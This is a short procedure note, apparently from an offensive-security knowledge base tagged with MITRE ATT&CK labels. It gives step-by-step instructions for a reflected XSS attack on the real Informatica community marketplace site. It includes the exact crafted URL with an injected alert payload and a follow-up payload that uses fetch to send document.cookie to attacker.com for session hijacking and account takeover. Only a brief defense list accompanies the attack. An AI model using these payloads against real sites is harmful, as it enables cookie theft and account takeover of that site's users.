---
tags:
  - xss-execution
  - javascript
  - code-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:27.007Z'
skill_level: beginner
impact_level: high
detection_risk: medium
sub_techniques: []
id: 1ceebdbf-6884-47e0-acff-e079032f154c
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-XSS-via-URL-Visit

## Summary

This procedure triggers the reflected XSS by visiting the crafted malicious URL, causing the injected JavaScript payload to execute in the browser context of the Informatica community marketplace page.

## Description

Once the malicious URL is prepared, visiting it in a browser decodes the payload and injects it into inline JavaScript on the page, such as modifying var projectChooserUrl ="/community/marketplace/"; to var projectChooserUrl ="/community/marketplace/"; alert(0); t="/project-chooser!input.jspa";. This executes arbitrary code, like an alert, and can be escalated to steal cookies (e.g., document.cookie sent to attacker server) or perform account takeover. The attack relies on the victim's browser processing the unsanitized path, with impacts including session hijacking. No server-side changes occur; execution is client-side.

## Requirements

1. Web browser (test in incognito to avoid caching)
2. Crafted URL from previous step
3. Optional: Attacker-controlled server for exfiltration testing

## Defense

Defensive measures and detection strategies:

- Deploy browser-based protections like XSS filters or extensions
- Implement strict CSP headers to block unsafe-inline scripts
- Detect and alert on anomalous JavaScript execution via client-side monitoring

## Objectives

1. Execute the injected payload
2. Verify code execution (e.g., alert popup)
3. Escalate to data exfiltration if possible

## Instructions

### Step 1: Visit Crafted URL

**Context**: Load the malicious URL to initiate payload decoding and injection.

Paste and enter the URL https://community.informatica.com/community/marketplace/%22;alert(0);t=%22/?blkCatIds=free+apps&view=solution into the browser address bar.

> The page loads, but the payload injects into JavaScript, triggering the alert(0) immediately.

### Step 2: Verify Execution and Escalate

**Context**: Confirm success and test for broader impacts.

Open developer console (F12) to inspect for errors or executed code. Replace alert(0) with a payload like ';fetch(`http://attacker.com?cookie=${document.cookie}`);t=' for exfiltration.

> Expected output includes an alert box or network request to attacker server, confirming arbitrary execution and potential cookie theft.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss-execution]]
- [[code-injection]]
